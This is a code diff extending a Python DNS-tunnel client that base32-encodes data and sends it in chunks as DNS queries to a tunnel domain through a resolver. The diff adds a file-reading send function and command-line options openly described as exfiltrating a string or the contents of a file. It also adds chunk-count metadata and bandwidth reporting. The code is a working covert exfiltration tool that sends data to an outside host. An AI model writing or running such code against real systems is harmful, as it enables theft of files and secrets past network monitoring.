@@ -64,7 +64,7 @@ class TxResult:
         self.robustness    = self.acked / self.total_chunks if self.total_chunks else 0.0
 
 
-def send_data(data: str, verbose: bool = True) -> TxResult:
+def send_data(data: str, verbose: bool = True, session_id: str = SESSION_ID) -> TxResult:
     """
     Encode *data* and transmit it chunk by chunk as DNS A queries.
     Returns a TxResult with timing + success metrics.
@@ -72,18 +72,19 @@ def send_data(data: str, verbose: bool = True) -> TxResult:
     payload = data.encode("utf-8")
     encoded = b32_encode(payload)
     chunks  = chunkify(encoded, CHUNK_SIZE)
+    total   = len(chunks)
 
     if verbose:
         print(f"\n[TX] Payload: {len(payload)} B  "
               f"→  encoded: {len(encoded)} chars  "
-              f"→  {len(chunks)} queries")
+              f"→  {total} queries")
 
     acked = 0
     nacked = 0
     t0 = time.monotonic()
 
     for seq, chunk in enumerate(chunks):
-        qname = f"{chunk}.{seq}.{SESSION_ID}.{TUNNEL_DOMAIN}"
+        qname = f"{chunk}.{seq}.{total}.{session_id}.{TUNNEL_DOMAIN}"
         try:
             req = dns.message.make_query(qname, dns.rdatatype.A)
             resp = dns.query.udp(req, RESOLVER_IP, timeout=2.0)
@@ -93,7 +94,7 @@ def send_data(data: str, verbose: bool = True) -> TxResult:
                 if str(rdata) == "1.0.0.1":
                     acked += 1
                     if verbose:
-                        print(f"  [{seq:03d}/{len(chunks)-1}] ACK  {chunk[:20]}…")
+                        print(f"  [{seq:03d}/{total-1:03d}] ACK  {chunk[:20]}…")
                 else:
                     nacked += 1
             else:
@@ -106,15 +107,24 @@ def send_data(data: str, verbose: bool = True) -> TxResult:
         time.sleep(INTER_QUERY)
 
     duration = time.monotonic() - t0
-    result = TxResult(len(payload), len(chunks), acked, nacked, duration)
+    result = TxResult(len(payload), total, acked, nacked, duration)
 
     if verbose:
-        print(f"\n[TX] Done – {acked}/{len(chunks)} ACKed  "
+        print(f"\n[TX] Done – {acked}/{total} ACKed  "
               f"| {result.bandwidth_bps:.2f} B/s  "
               f"| robustness {result.robustness*100:.1f}%  "
               f"| elapsed {duration:.2f}s")
 
     return result
+
+
+def send_file(file_path: str, verbose: bool = True, session_id: str = SESSION_ID) -> TxResult:
+    """Read a text file and transmit its contents through the DNS tunnel."""
+    with open(file_path, "r", encoding="utf-8") as f:
+        content = f.read()
+    if verbose:
+        print(f"[TX] Reading input file '{file_path}' ({len(content.encode('utf-8'))} B)")
+    return send_data(content, verbose=verbose, session_id=session_id)
 
 
 # ── Metric measurements ───────────────────────────────────────
@@ -217,13 +227,16 @@ def run_demo():
 
 
 if __name__ == "__main__":
-    p = argparse.ArgumentParser()
-    p.add_argument("--demo",    action="store_true")
-    p.add_argument("--measure", action="store_true")
-    p.add_argument("--send",    metavar="TEXT")
+    p = argparse.ArgumentParser(description="DNS Tunnel Client")
+    p.add_argument("--demo",    action="store_true", help="Run full demo + measurements")
+    p.add_argument("--measure", action="store_true", help="Collect metrics only")
+    p.add_argument("--send",    metavar="TEXT",      help="Exfiltrate a specific string")
+    p.add_argument("--file",    metavar="PATH",      help="Exfiltrate contents of a text file")
     args = p.parse_args()
 
-    if args.send:
+    if args.file:
+        send_file(args.file)
+    elif args.send:
         send_data(args.send)
     elif args.measure:
         measure_bandwidth()
